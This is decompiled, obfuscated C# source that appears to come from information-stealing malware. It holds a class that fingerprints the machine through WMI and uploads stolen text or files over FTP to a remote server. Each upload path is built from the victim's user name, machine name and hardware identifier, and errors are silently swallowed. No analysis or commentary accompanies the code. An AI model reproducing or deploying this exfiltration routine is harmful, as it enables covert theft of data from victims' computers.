using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fAuBSMaVICral;

internal sealed class mYaTrXhnsaDz
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string CqIShzUcnB()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107365294));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107364729)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107364744);
			ManagementObject val3 = new ManagementObject(getString_0(107364707) + text2 + getString_0(107364666));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107364693)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107352569) : text;
		}
	}

	public static void dLOpMuFXHLb(string yYHgcNZtdVjImNj = "URL", string CinCMlnUcbUSL = "USERNAME", string MMzabxViTErmNm = "ACCESO", string QXhuyxDhthT = "")
	{
		try
		{
			string text = CqIShzUcnB();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(yYHgcNZtdVjImNj + getString_0(107366488) + Environment.UserName + getString_0(107366507) + Environment.MachineName + getString_0(107366486) + text + getString_0(107366481));
			ftpWebRequest.Method = getString_0(107364636);
			ftpWebRequest.Credentials = new NetworkCredential(CinCMlnUcbUSL, MMzabxViTErmNm);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(QXhuyxDhthT);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void jPGIJOflxVN(string jaZpHFsGRnj = "URL", string wDXISinZoaEC = "USERNAME", string UzQTcwngDc = "ACCESO", string hPjyAYZHIYy = "")
	{
		try
		{
			string text = CqIShzUcnB();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(jaZpHFsGRnj + getString_0(107366488) + Environment.UserName + getString_0(107366507) + Environment.MachineName + getString_0(107366486) + text + getString_0(107366486) + Path.GetFileName(hPjyAYZHIYy));
			ftpWebRequest.Method = getString_0(107364636);
			ftpWebRequest.Credentials = new NetworkCredential(wDXISinZoaEC, UzQTcwngDc);
			byte[] array = File.ReadAllBytes(hPjyAYZHIYy);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static mYaTrXhnsaDz()
	{
		Strings.CreateGetStringDelegate(typeof(mYaTrXhnsaDz));
	}
}
